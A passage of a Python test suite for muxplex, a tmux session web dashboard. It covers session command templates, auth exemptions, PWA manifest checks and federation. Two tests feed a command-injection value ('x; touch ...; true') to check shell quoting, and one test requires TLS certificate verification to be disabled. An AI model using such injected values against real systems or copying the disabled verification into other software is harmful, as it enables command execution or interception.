    assert len(captured) == 1
    assert shlex.quote(payload) in captured[0], (
        f"delete must shlex.quote the substituted name, got: {captured[0]!r}"
    )
    # The raw, unquoted metacharacter sequence must NOT appear un-neutralized.
    assert f"-t {payload}" not in captured[0]


def test_create_session_shlex_quote_defense_in_depth(client, monkeypatch, tmp_path):
    """If the allowlist is ever loosened, create still shlex.quotes the name."""
    import json
    import shlex
    from unittest.mock import AsyncMock, MagicMock

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(json.dumps({"new_session_template": "echo {name}"}))
    monkeypatch.setattr("muxplex.main.is_valid_session_name", lambda name: True)

    proc = MagicMock()
    proc.communicate = AsyncMock(return_value=(b"", b""))
    proc.returncode = 0

    captured = []

    async def mock_shell(cmd, **kwargs):
        captured.append(cmd)
        return proc

    monkeypatch.setattr("tmux_kit.spawn.asyncio.create_subprocess_shell", mock_shell)

    payload = "x; touch /tmp/deckdev-quote; true"
    resp = client.post("/api/sessions", json={"name": payload})
    assert resp.status_code == 200
    assert len(captured) == 1
    assert shlex.quote(payload) in captured[0], (
        f"create must shlex.quote the substituted name, got: {captured[0]!r}"
    )


# ---------------------------------------------------------------------------
# Named session command pairs (docs/plans/2026-08-02-named-session-command-pairs-plan.md)
# ---------------------------------------------------------------------------


def _write_pairs_settings(monkeypatch, tmp_path, extra_commands=None):
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "new_session_template": "tmux new-session -d -s {name}",
                "delete_session_template": "tmux kill-session -t {name}",
                "session_commands": extra_commands or [],
            }
        )
    )
    return settings_path


def _amplifier_pair():
    return {
        "id": "amplifier",
        "label": "Amplifier",
        "new_session_template": "echo new {name}",
        "delete_session_template": "echo del {name}",
    }


def test_get_session_commands_default_only(client, monkeypatch, tmp_path):
    _write_pairs_settings(monkeypatch, tmp_path)
    resp = client.get("/api/session-commands")
    assert resp.status_code == 200
    body = resp.json()
    assert len(body["commands"]) == 1
    assert body["commands"][0]["id"] == "default"
    assert body["default_id"] == "default"
    assert body["errors"] == []


def test_get_session_commands_lists_configured(client, monkeypatch, tmp_path):
    _write_pairs_settings(monkeypatch, tmp_path, [_amplifier_pair()])
    resp = client.get("/api/session-commands")
    body = resp.json()
    ids = [c["id"] for c in body["commands"]]
    assert ids == ["default", "amplifier"]
    amp = body["commands"][1]
    assert amp["label"] == "Amplifier"
    assert amp["new_session_template"] == "echo new {name}"
    assert amp["delete_session_template"] == "echo del {name}"


def test_get_session_commands_reports_errors(client, monkeypatch, tmp_path):
    _write_pairs_settings(monkeypatch, tmp_path, [{"id": "bad!"}])
    resp = client.get("/api/session-commands")
    body = resp.json()
    assert [c["id"] for c in body["commands"]] == ["default"]
    assert len(body["errors"]) == 1


def test_get_session_commands_requires_auth():
    """Not in auth._AUTH_EXEMPT_PATHS -- discloses server-side shell commands."""
    from muxplex.auth import _AUTH_EXEMPT_PATHS

    assert "/api/session-commands" not in _AUTH_EXEMPT_PATHS


def test_create_without_command_id_unchanged(client, monkeypatch, tmp_path):
    """Byte-identity: response name/ok unchanged; the spawned command is
    new_session_template."""
    from unittest.mock import AsyncMock, MagicMock

    _write_pairs_settings(monkeypatch, tmp_path, [_amplifier_pair()])
    mock_proc = MagicMock()
    mock_proc.communicate = AsyncMock(return_value=(b"", b""))
    mock_proc.returncode = 0
    captured = []

    async def mock_shell(cmd, **kwargs):
        captured.append(cmd)
        return mock_proc

    monkeypatch.setattr("tmux_kit.spawn.asyncio.create_subprocess_shell", mock_shell)

    resp = client.post("/api/sessions", json={"name": "plain"})
    assert resp.status_code == 200
    data = resp.json()
    assert data["name"] == "plain"
    assert data["ok"] is True
    assert captured == ["tmux new-session -d -s plain"]


def test_create_response_includes_command_id(client, monkeypatch, tmp_path):
    from unittest.mock import AsyncMock, MagicMock

    _write_pairs_settings(monkeypatch, tmp_path)
    mock_proc = MagicMock()
    mock_proc.communicate = AsyncMock(return_value=(b"", b""))
    mock_proc.returncode = 0
    monkeypatch.setattr(
        "tmux_kit.spawn.asyncio.create_subprocess_shell",
        AsyncMock(return_value=mock_proc),
    )

    resp = client.post("/api/sessions", json={"name": "plain2"})
    assert resp.json()["command_id"] == "default"


def test_create_with_command_id_uses_that_pair(client, monkeypatch, tmp_path):
    from unittest.mock import AsyncMock, MagicMock

    _write_pairs_settings(monkeypatch, tmp_path, [_amplifier_pair()])
    mock_proc = MagicMock()
    mock_proc.communicate = AsyncMock(return_value=(b"", b""))
    mock_proc.returncode = 0
    captured = []

    async def mock_shell(cmd, **kwargs):
        captured.append(cmd)
        return mock_proc

    monkeypatch.setattr("tmux_kit.spawn.asyncio.create_subprocess_shell", mock_shell)

    resp = client.post(
        "/api/sessions", json={"name": "amp-sess", "command_id": "amplifier"}
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["command_id"] == "amplifier"
    assert captured == ["echo new amp-sess"]


def test_create_unknown_command_id_400_nothing_spawned(client, monkeypatch, tmp_path):
    from unittest.mock import AsyncMock

    _write_pairs_settings(monkeypatch, tmp_path)
    spawned = AsyncMock()
    monkeypatch.setattr("tmux_kit.spawn.asyncio.create_subprocess_shell", spawned)

    resp = client.post("/api/sessions", json={"name": "x", "command_id": "typo"})
    assert resp.status_code == 400
    body = resp.json()["detail"]
    assert body["unknown_command_id"] is True
    assert "available" in body
    spawned.assert_not_called()


def test_create_records_command_id_in_manifest(client, monkeypatch, tmp_path):
    from unittest.mock import AsyncMock, MagicMock

    import muxplex.manifest as manifest_mod

    manifest_path = tmp_path / "state" / "sessions.json"
    monkeypatch.setattr(manifest_mod, "MANIFEST_PATH", manifest_path)
    monkeypatch.setattr("muxplex.main.load_manifest", manifest_mod.load_manifest)
    monkeypatch.setattr("muxplex.main.save_manifest", manifest_mod.save_manifest)
    _write_pairs_settings(monkeypatch, tmp_path, [_amplifier_pair()])
    mock_proc = MagicMock()
    mock_proc.communicate = AsyncMock(return_value=(b"", b""))
    mock_proc.returncode = 0
    monkeypatch.setattr(
        "tmux_kit.spawn.asyncio.create_subprocess_shell",
        AsyncMock(return_value=mock_proc),
    )

    resp = client.post(
        "/api/sessions", json={"name": "recorded", "command_id": "amplifier"}
    )
    assert resp.status_code == 200
    manifest = manifest_mod.load_manifest()
    assert manifest["created_with"]["recorded"] == "amplifier"


def test_create_failure_records_nothing(client, monkeypatch, tmp_path):

    import muxplex.manifest as manifest_mod

    manifest_path = tmp_path / "state" / "sessions.json"
    monkeypatch.setattr(manifest_mod, "MANIFEST_PATH", manifest_path)
    monkeypatch.setattr("muxplex.main.load_manifest", manifest_mod.load_manifest)
    monkeypatch.setattr("muxplex.main.save_manifest", manifest_mod.save_manifest)
    _write_pairs_settings(monkeypatch, tmp_path)
    monkeypatch.setattr("shutil.which", lambda cmd: None)

    resp = client.post("/api/sessions", json={"name": "failed"})
    assert resp.status_code == 500
    manifest = manifest_mod.load_manifest()
    assert "failed" not in manifest.get("created_with", {})


def test_delete_no_record_uses_default(client, monkeypatch, tmp_path):
    """Byte-identity: the subprocess command equals today's exactly."""
    from unittest.mock import MagicMock, patch

    import muxplex.manifest as manifest_mod

    manifest_path = tmp_path / "state" / "sessions.json"
    monkeypatch.setattr(manifest_mod, "MANIFEST_PATH", manifest_path)
    monkeypatch.setattr("muxplex.main.load_manifest", manifest_mod.load_manifest)
    _write_pairs_settings(monkeypatch, tmp_path, [_amplifier_pair()])
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["untracked"])

    captured = []

    def mock_run(cmd, **kwargs):
        captured.append(cmd)
        result = MagicMock()
        result.returncode = 0
        result.stderr = ""
        return result

    with patch("muxplex.main.subprocess.run", side_effect=mock_run):
        resp = client.delete("/api/sessions/untracked")

    assert resp.status_code == 200
    data = resp.json()
    assert data["command_id"] == "default"
    assert "forced" not in data
    assert captured == ["tmux kill-session -t untracked"]


def test_delete_uses_recorded_pair(client, monkeypatch, tmp_path):
    from unittest.mock import MagicMock, patch

    import muxplex.manifest as manifest_mod

    manifest_path = tmp_path / "state" / "sessions.json"
    monkeypatch.setattr(manifest_mod, "MANIFEST_PATH", manifest_path)
    monkeypatch.setattr("muxplex.main.load_manifest", manifest_mod.load_manifest)
    manifest_mod.save_manifest(
        manifest_mod.set_created_with(
            manifest_mod.load_manifest(), "amp-sess", "amplifier"
        )
    )
    _write_pairs_settings(monkeypatch, tmp_path, [_amplifier_pair()])
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["amp-sess"])

    captured = []

    def mock_run(cmd, **kwargs):
        captured.append(cmd)
        result = MagicMock()
        result.returncode = 0
        result.stderr = ""
        return result

    with patch("muxplex.main.subprocess.run", side_effect=mock_run):
        resp = client.delete("/api/sessions/amp-sess")

    assert resp.status_code == 200
    assert resp.json()["command_id"] == "amplifier"
    assert captured == ["echo del amp-sess"]


def test_delete_unknown_recorded_id_409_nothing_run(client, monkeypatch, tmp_path):
    from unittest.mock import MagicMock, patch

    import muxplex.manifest as manifest_mod

    manifest_path = tmp_path / "state" / "sessions.json"
    monkeypatch.setattr(manifest_mod, "MANIFEST_PATH", manifest_path)
    monkeypatch.setattr("muxplex.main.load_manifest", manifest_mod.load_manifest)
    manifest_mod.save_manifest(
        manifest_mod.set_created_with(
            manifest_mod.load_manifest(), "orphan", "gone-pair"
        )
    )
    _write_pairs_settings(monkeypatch, tmp_path)  # "gone-pair" not configured
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["orphan"])

    run = MagicMock()
    with patch("muxplex.main.subprocess.run", run):
        resp = client.delete("/api/sessions/orphan")

    assert resp.status_code == 409
    body = resp.json()["detail"]
    assert body["unknown_command_id"] is True
    assert body["command_id"] == "gone-pair"
    assert "available" in body
    run.assert_not_called()


def test_delete_force_uses_default_and_flags(client, monkeypatch, tmp_path, caplog):
    from unittest.mock import MagicMock, patch

    import muxplex.manifest as manifest_mod

    manifest_path = tmp_path / "state" / "sessions.json"
    monkeypatch.setattr(manifest_mod, "MANIFEST_PATH", manifest_path)
    monkeypatch.setattr("muxplex.main.load_manifest", manifest_mod.load_manifest)
    manifest_mod.save_manifest(
        manifest_mod.set_created_with(
            manifest_mod.load_manifest(), "orphan2", "gone-pair"
        )
    )
    _write_pairs_settings(monkeypatch, tmp_path)
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["orphan2"])

    def mock_run(cmd, **kwargs):
        result = MagicMock()
        result.returncode = 0
        result.stderr = ""
        return result

    with (
        patch("muxplex.main.subprocess.run", side_effect=mock_run),
        caplog.at_level("WARNING"),
    ):
        resp = client.delete("/api/sessions/orphan2?force=true")

    assert resp.status_code == 200
    data = resp.json()
    assert data["forced"] is True
    assert data["command_id"] == "default"
    assert "gone-pair" in caplog.text


def test_delete_response_includes_command_id(client, monkeypatch, tmp_path):
    from unittest.mock import AsyncMock

    _write_pairs_settings(monkeypatch, tmp_path)
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["my-session"])
    monkeypatch.setattr("muxplex.main.run_tmux", AsyncMock(return_value=""))

    resp = client.delete("/api/sessions/my-session")
    assert resp.json()["command_id"] == "default"


def test_delete_still_returns_200_on_command_failure(client, monkeypatch, tmp_path):
    """Existing contract preserved: 200 even when the run command fails."""
    from unittest.mock import patch

    _write_pairs_settings(monkeypatch, tmp_path)
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["my-session"])

    with patch("muxplex.main.subprocess.run", side_effect=RuntimeError("boom")):
        resp = client.delete("/api/sessions/my-session")

    assert resp.status_code == 200
    assert resp.json()["ok"] is True


def test_federation_create_forwards_command_id(monkeypatch, tmp_path):
    """Body is {"name": ...} when command_id absent; includes command_id
    when present (spec §7.4)."""
    import asyncio

    from muxplex.main import CreateSessionPayload, federation_create_session

    captured = {}

    class FakeResponse:
        def raise_for_status(self):
            pass

        def json(self):
            return {"name": "x", "ok": True}

    class FakeClient:
        async def post(self, url, headers=None, json=None):
            captured["json"] = json
            return FakeResponse()

    class FakeRequest:
        class app:
            class state:
                federation_client = FakeClient()

    monkeypatch.setattr(
        "muxplex.main._lookup_remote_by_device_id",
        lambda device_id: {"url": "http://remote", "key": "k"},
    )

    asyncio.run(
        federation_create_session(
            "dev1",
            CreateSessionPayload(name="x"),
            FakeRequest(),  # type: ignore[arg-type]
        )
    )
    assert captured["json"] == {"name": "x"}

    asyncio.run(
        federation_create_session(
            "dev1",
            CreateSessionPayload(name="x", command_id="amplifier"),
            FakeRequest(),  # type: ignore[arg-type]
        )
    )
    assert captured["json"] == {"name": "x", "command_id": "amplifier"}


# ---------------------------------------------------------------------------
# Issue 1: Static assets exempt from auth middleware
# ---------------------------------------------------------------------------


def test_static_asset_accessible_from_non_localhost_without_auth(monkeypatch):
    """Static assets (.svg, .css, .js etc.) are served without auth from non-localhost.

    The login page needs its own CSS/JS/images to render before the user has
    authenticated. The auth middleware must exempt static file extensions.
    """
    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-pw")
    with TestClient(app, base_url="http://192.168.1.1", follow_redirects=False) as c:
        response = c.get("/wordmark-on-dark.svg")
    assert response.status_code == 200, (
        f"Expected 200 for static asset from non-localhost, got {response.status_code}"
    )


def test_css_asset_accessible_from_non_localhost_without_auth(monkeypatch):
    """CSS files are served without auth from non-localhost."""
    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-pw")
    with TestClient(app, base_url="http://192.168.1.1", follow_redirects=False) as c:
        response = c.get("/style.css")
    assert response.status_code == 200, (
        f"Expected 200 for CSS from non-localhost, got {response.status_code}"
    )


# ---------------------------------------------------------------------------
# /deck/ — soft deck static route (frontend/deck/, mounted for free by the
# existing `html=True` static mount at "/" — main.py adds no route handler)
# ---------------------------------------------------------------------------


def test_deck_index_served_at_deck_path(client):
    """GET /deck/ serves frontend/deck/index.html with 200 + HTML content-type."""
    response = client.get("/deck/")
    assert response.status_code == 200
    assert "text/html" in response.headers["content-type"]
    assert "deck-root" in response.text


def test_deck_js_served_and_not_a_404(client):
    """GET /deck/deck.js is served (not 404) — confirms the static mount
    reaches the new subdirectory."""
    response = client.get("/deck/deck.js")
    assert response.status_code == 200
    assert "classifyStaleness" in response.text


def test_deck_css_served(client):
    """GET /deck/deck.css is served."""
    response = client.get("/deck/deck.css")
    assert response.status_code == 200


def test_deck_manifest_served_with_deck_scope(client):
    """GET /deck/manifest.json is served and scoped to /deck/ (distinct from
    the root app's manifest.json, so the two installed PWAs don't collide)."""
    response = client.get("/deck/manifest.json")
    assert response.status_code == 200
    data = response.json()
    assert data["start_url"] == "/deck/"
    assert data["scope"] == "/deck/"
    assert data["id"] == "/deck/"


def test_deck_manifest_fullscreen_and_landscape(client):
    """display=fullscreen (required before screen.orientation.lock() will
    fire per Chromium's ScreenOrientationProvider -- standalone does not
    satisfy it) and orientation=landscape (baked into the WebAPK at mint
    time, giving game-like forced landscape without a manual rotate)."""
    response = client.get("/deck/manifest.json")
    assert response.status_code == 200
    data = response.json()
    assert data["display"] == "fullscreen", (
        "display must be 'fullscreen' -- 'standalone' fails Chromium's "
        "FULLSCREEN_REQUIRED check for screen.orientation.lock()"
    )
    assert data["orientation"] == "landscape"


def test_deck_manifest_icons_meet_chromium_installability_criteria(client):
    """Validate against Chromium's ACTUAL installability rules, not just
    that the JSON keys exist: a 192px and a 512px icon must both be
    present, correctly-sized PNGs, and each under 512KB (above that,
    Chrome sends a URL reference instead of inlining icon bytes into the
    WebAPK-mint request, which then requires the server be publicly
    reachable from Google's infrastructure)."""
    import pathlib
    import struct

    response = client.get("/deck/manifest.json")
    assert response.status_code == 200
    data = response.json()
    icons = data["icons"]
    assert len(icons) >= 2

    sizes_present = {icon["sizes"] for icon in icons}
    assert "192x192" in sizes_present
    assert "512x512" in sizes_present

    frontend_dir = pathlib.Path(__file__).parent.parent / "frontend"
    max_bytes = 512 * 1024
    checked = set()
    for icon in icons:
        src = icon["src"].lstrip("/")
        if src in checked:
            continue
        checked.add(src)
        icon_path = frontend_dir / src
        assert icon_path.is_file(), f"Manifest references missing icon file: {src}"

        raw = icon_path.read_bytes()
        assert len(raw) < max_bytes, (
            f"{src} is {len(raw)} bytes -- must be under 512KB or Chrome "
            "sends a URL reference instead of inlining the bytes"
        )

        # Parse real PNG dimensions from the IHDR chunk (bytes 16-24,
        # big-endian uint32 width then height) -- verifies the FILE matches
        # what the manifest claims, not just that the JSON says so.
        assert raw[:8] == b"\x89PNG\r\n\x1a\n", f"{src} is not a valid PNG"
        width, height = struct.unpack(">II", raw[16:24])
        expected = icon["sizes"]
        actual = f"{width}x{height}"
        assert actual == expected, (
            f"{src} manifest claims {expected} but the real PNG is {actual}"
        )


def test_deck_manifest_icons_include_a_maskable_variant(client):
    """Chromium's installability criteria require at least one icon with
    purpose 'any' AND recommend a 'maskable' variant for adaptive icon
    shells on Android -- confirms the maskable entry wasn't lost."""
    response = client.get("/deck/manifest.json")
    data = response.json()
    purposes = {icon.get("purpose", "any") for icon in data["icons"]}
    assert "maskable" in purposes
    assert "any" in purposes


def test_deck_service_worker_served_and_has_fetch_handler(client):
    """GET /deck/sw.js is served. Not required for the "Install app" menu
    item since Chrome 108, but Chrome's own installability docs still
    require a `fetch` event handler for the automatic install PROMPT to
    appear."""
    response = client.get("/deck/sw.js")
    assert response.status_code == 200
    assert "addEventListener('fetch'" in response.text


def test_deck_service_worker_caches_nothing(client):
    """Regression guard: the deck's service worker must never introduce a
    cache -- AGENTS.md documents this exact failure class shipping five
    times already (stale frontend bytes served after a deploy)."""
    response = client.get("/deck/sw.js")
    assert response.status_code == 200
    lowered = response.text.lower()
    assert "caches.open" not in lowered
    assert "cache.put" not in lowered
    assert "cache.addall" not in lowered


def test_deck_js_and_css_accessible_from_non_localhost_without_auth(monkeypatch):
    """deck.js/deck.css are served pre-auth from non-localhost (same static-
    extension exemption as app.js/style.css) -- required so an installed
    /deck/ PWA's own assets load before the login redirect resolves."""
    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-pw")
    with TestClient(app, base_url="http://192.168.1.1", follow_redirects=False) as c:
        js_response = c.get("/deck/deck.js")
        css_response = c.get("/deck/deck.css")
    assert js_response.status_code == 200
    assert css_response.status_code == 200


def test_deck_responses_carry_no_cache_header(client):
    """/deck/ responses inherit the same load-bearing no-cache header as the
    root app (AGENTS.md: 'the no-cache header is load-bearing') -- an
    installed deck PWA must not serve a stale app shell across deploys."""
    for path in ("/deck/", "/deck/deck.js", "/deck/deck.css"):
        response = client.get(path)
        assert response.status_code == 200, f"GET {path} -> {response.status_code}"
        assert response.headers.get("cache-control") == "no-cache", (
            f"GET {path}: expected 'Cache-Control: no-cache', "
            f"got {response.headers.get('cache-control')!r}"
        )


def test_deck_index_is_gated_by_auth_from_non_localhost(monkeypatch):
    """GET /deck/ (the directory index, no static extension) is NOT auth-
    exempt -- an unauthenticated non-localhost request is redirected to
    /login rather than served, same as the root app's index.html."""
    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-pw")
    with TestClient(app, base_url="http://192.168.1.1", follow_redirects=False) as c:
        response = c.get("/deck/")
    assert response.status_code == 307
    assert response.headers["location"] == "/login?next=%2Fdeck%2F"


# ---------------------------------------------------------------------------
# Frontend cache policy: no-cache (forced revalidation) on frontend responses
# ---------------------------------------------------------------------------


def test_frontend_responses_carry_no_cache_header(client):
    """Frontend responses (app shell + static assets) must carry
    Cache-Control: no-cache so installed PWAs revalidate on every load
    instead of serving stale JS across deploys. With ETag/Last-Modified
    this costs a cheap 304 when nothing changed."""
    for path in ("/", "/index.html", "/app.js", "/style.css"):
        response = client.get(path)
        assert response.status_code == 200, f"GET {path} -> {response.status_code}"
        assert response.headers.get("cache-control") == "no-cache", (
            f"GET {path}: expected 'Cache-Control: no-cache', "
            f"got {response.headers.get('cache-control')!r}"
        )


def test_api_responses_do_not_carry_no_cache_header(client):
    """/api responses must NOT be affected by the frontend cache policy."""
    response = client.get("/api/state")
    assert response.status_code == 200
    assert "no-cache" not in response.headers.get("cache-control", ""), (
        f"/api/state unexpectedly carries "
        f"Cache-Control: {response.headers.get('cache-control')!r}"
    )


def test_startup_logs_frontend_identity(caplog):
    """Lifespan startup emits one line identifying the served app.js
    (short md5) so 'which JS is this server serving?' is a glance."""
    import logging

    with caplog.at_level(logging.INFO, logger="muxplex.main"), TestClient(app):
        pass
    assert any(
        "frontend: app.js " in record.getMessage() for record in caplog.records
    ), "expected startup log line 'frontend: app.js <md5-8>'"


# ---------------------------------------------------------------------------
# Issue 2: Hostname in page title
# ---------------------------------------------------------------------------


def test_index_page_title_contains_hostname(client):
    """GET / returns HTML with hostname in page title (e.g. 'myhost — muxplex')."""
    import socket

    hostname = socket.gethostname().split(".")[0]
    response = client.get("/")
    assert response.status_code == 200
    assert hostname in response.text, (
        f"Expected hostname '{hostname}' in title of index page"
    )
    assert "muxplex" in response.text


def test_login_page_title_contains_hostname(client):
    """GET /login returns HTML with hostname in page title (e.g. 'Sign in — myhost — muxplex')."""
    import socket

    hostname = socket.gethostname().split(".")[0]
    response = client.get("/login")
    assert response.status_code == 200
    assert hostname in response.text, (
        f"Expected hostname '{hostname}' in title of login page"
    )


# ---------------------------------------------------------------------------
# DELETE /api/sessions/{name} — custom template (task: customizable delete command)
# ---------------------------------------------------------------------------


def test_delete_session_uses_template_command(client, monkeypatch, tmp_path):
    """DELETE /api/sessions/{name} must execute the delete_session_template from settings.

    The template {name} placeholder must be substituted with the session name.
    The command must be run synchronously via subprocess.run (not run_tmux).
    """
    from unittest.mock import MagicMock, patch

    # Make the session appear to exist so the 404 guard passes
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["myworkspace"])

    # Redirect settings to a temp path so we can write a custom template
    import muxplex.settings as settings_mod

    fake_settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", fake_settings_path)

    # Write a custom template
    import json

    fake_settings_path.write_text(
        json.dumps(
            {
                "delete_session_template": "echo destroy {name}",
            }
        )
    )

    # Capture subprocess.run calls
    captured_commands = []

    def mock_run(cmd, **kwargs):
        captured_commands.append(cmd)
        result = MagicMock()
        result.returncode = 0
        result.stderr = ""
        return result

    with patch("muxplex.main.subprocess.run", side_effect=mock_run):
        response = client.delete("/api/sessions/myworkspace")

    assert response.status_code == 200, (
        f"DELETE /api/sessions/myworkspace must return 200, got {response.status_code}"
    )
    data = response.json()
    assert data.get("ok") is True, f"Response must have ok=True, got: {data}"
    assert data.get("name") == "myworkspace", (
        f"Response must have name='myworkspace', got: {data}"
    )

    # Verify template substitution happened
    assert len(captured_commands) == 1, (
        f"subprocess.run must be called exactly once, called {len(captured_commands)} times"
    )
    executed_cmd = captured_commands[0]
    assert "myworkspace" in executed_cmd, (
        f"Executed command must contain session name 'myworkspace', got: {executed_cmd!r}"
    )
    assert "echo destroy" in executed_cmd, (
        f"Executed command must use the custom template, got: {executed_cmd!r}"
    )


def test_delete_session_default_template_is_tmux_kill(client, monkeypatch, tmp_path):
    """DELETE /api/sessions/{name} uses 'tmux kill-session -t {name}' when no custom template is set."""
    from unittest.mock import MagicMock, patch

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["mysession"])

    # Redirect settings to empty temp file (no settings file = use defaults)
    import muxplex.settings as settings_mod

    fake_settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", fake_settings_path)
    # Don't write any settings — defaults should be used

    captured_commands = []

    def mock_run(cmd, **kwargs):
        captured_commands.append(cmd)
        result = MagicMock()
        result.returncode = 0
        result.stderr = ""
        return result

    with patch("muxplex.main.subprocess.run", side_effect=mock_run):
        response = client.delete("/api/sessions/mysession")

    assert response.status_code == 200
    assert len(captured_commands) == 1
    executed_cmd = captured_commands[0]
    # Default template substituted
    assert "mysession" in executed_cmd, (
        f"Default template must substitute session name, got: {executed_cmd!r}"
    )
    assert "kill-session" in executed_cmd, (
        f"Default template must contain 'kill-session', got: {executed_cmd!r}"
    )


# ---------------------------------------------------------------------------
# Federation Bearer token auth
# ---------------------------------------------------------------------------


def test_federation_bearer_auth_accepted(monkeypatch):
    """Request with valid Bearer token gets 200 on /api/sessions when federation key is set.

    Patches the federation key on the AuthMiddleware instance (since the key is
    loaded once at module startup) and verifies that a Bearer-authenticated
    request reaches /api/sessions with HTTP 200.

    Before implementation: fails with ImportError — _federation_key not in main.py.
    After implementation: _federation_key exists, middleware is found and patched,
    Bearer request is accepted.
    """
    import muxplex.main as main_module
    from muxplex.auth import AuthMiddleware

    federation_key = "test-federation-key-abc123"
    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")

    with TestClient(main_module.app) as c:
        # Traverse the compiled middleware stack to find the AuthMiddleware instance
        stack = main_module.app.middleware_stack
        auth_mw = None
        for _ in range(20):
            if isinstance(stack, AuthMiddleware):
                auth_mw = stack
                break
            stack = getattr(stack, "app", None)
            if stack is None:
                break

        assert auth_mw is not None, "AuthMiddleware not found in middleware stack"
        # Patch the federation key so Bearer token auth is enabled
        auth_mw.federation_key = federation_key

        # A request with a matching Bearer token must pass auth and get 200
        response = c.get(
            "/api/sessions",
            headers={"Authorization": f"Bearer {federation_key}"},
        )

    assert response.status_code == 200


# ---------------------------------------------------------------------------
# httpx.AsyncClient federation client on app.state (task-7)
# ---------------------------------------------------------------------------


def test_federation_client_exists_on_app_state(monkeypatch):
    """app.state.federation_client is set during lifespan and is not None.

    Verifies that the lifespan creates an httpx.AsyncClient and attaches it to
    app.state.federation_client before the application begins serving requests.
    """
    import httpx

    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")

    with TestClient(app):
        # Inside the context manager the lifespan has completed startup,
        # so app.state.federation_client must be set.
        assert hasattr(app.state, "federation_client"), (
            "app.state.federation_client must be set during lifespan startup"
        )
        assert app.state.federation_client is not None, (
            "app.state.federation_client must not be None"
        )
        assert isinstance(app.state.federation_client, httpx.AsyncClient), (
            "app.state.federation_client must be an httpx.AsyncClient instance"
        )
        # Capture reference before lifespan shuts down
        client_ref = app.state.federation_client

    # After lifespan shutdown completes, the client must be closed
    assert client_ref.is_closed, (
        "app.state.federation_client must be closed after lifespan shutdown"
    )


def test_federation_client_disables_ssl_verification(monkeypatch):
    """Federation httpx client must disable SSL verification for self-signed certs.

    muxplex setup-tls can generate self-signed certificates. When a remote instance
    uses such a cert, httpx's default SSL verification rejects it with
    CERTIFICATE_VERIFY_FAILED, making the remote unreachable in federation.
    The client must use verify=False so self-signed certs on LAN/Tailscale remotes
    are accepted. Bearer token auth still protects authorization.
    """
    import ssl

    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")

    with TestClient(app):
        client = app.state.federation_client
        # httpx.AsyncClient(verify=False) creates a transport whose SSL context
        # has verify_mode=ssl.CERT_NONE (0). If verify=True (default), it would
        # use CERT_REQUIRED (2).
        ssl_context = client._transport._pool._ssl_context
        assert ssl_context is not None, "federation_client SSL context must be present"
        assert ssl_context.verify_mode == ssl.CERT_NONE, (
            "federation_client must use verify=False (CERT_NONE) "
            "to support self-signed certificates on remote instances"
        )


# ---------------------------------------------------------------------------
# GET /api/federation/sessions (task-5)
# ---------------------------------------------------------------------------


def test_federation_sessions_returns_local_sessions(client, monkeypatch, tmp_path):
    """GET /api/federation/sessions returns local sessions tagged with deviceName and remoteId=None.

    Local sessions must have:
    - deviceName from settings device_name
    - remoteId set to None
    - The session fields (name, snapshot, bell) from local /api/sessions
    """
    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # Write settings with a known device_name and no remote instances
    import json

    settings_path.write_text(
        json.dumps({"device_name": "my-workstation", "remote_instances": []})
    )

    # Mock local session data
    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["session-one"])
    monkeypatch.setattr(
        "muxplex.main.get_snapshots", lambda: {"session-one": "pane text"}
    )

    response = client.get("/api/federation/sessions")
    assert response.status_code == 200
    data = response.json()

    # Must return a list
    assert isinstance(data, list)

    # Find local sessions (remoteId=None)
    local_sessions = [s for s in data if s.get("remoteId") is None]
    assert len(local_sessions) == 1, f"Expected 1 local session, got: {local_sessions}"

    local = local_sessions[0]
    assert local["name"] == "session-one"
    assert local["deviceName"] == "my-workstation"
    assert local["remoteId"] is None


def test_federation_sessions_remote_id_is_integer_index(client, monkeypatch, tmp_path):
    """GET /api/federation/sessions returns device_id-based remoteId for remote sessions.

    When a remote doesn't have a device_id field, remoteId falls back to str(index)
    (e.g. '0', '1', '2'...) -- NOT the URL string and NOT any 'id' field from the
    remote config dict. When device_id is set, it is used directly.
    """
    import json

    import httpx

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # Two remote instances -- first will succeed, second will fail
    settings_path.write_text(
        json.dumps(
            {
                "device_name": "local-host",
                "remote_instances": [
                    {
                        "url": "http://spark-2:8088",
                        "key": "abc123",
                        "name": "spark-2",
                    },
                    {
                        "url": "http://spark-3:8088",
                        "key": "def456",
                        "name": "spark-3",
                    },
                ],
            }
        )
    )

    monkeypatch.setattr("muxplex.main.get_session_list", list)
    monkeypatch.setattr("muxplex.main.get_snapshots", dict)

    from unittest.mock import MagicMock

    # First remote returns one session; second is unreachable
    async def mock_get(url, **kwargs):
        if "spark-2" in url:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.raise_for_status = lambda: None
            mock_resp.json = lambda: [{"name": "work", "snapshot": "", "bell": {}}]
            return mock_resp
        raise httpx.ConnectError("refused")

    mock_client = MagicMock()
    mock_client.get = mock_get
    monkeypatch.setattr(client.app.state, "federation_client", mock_client)

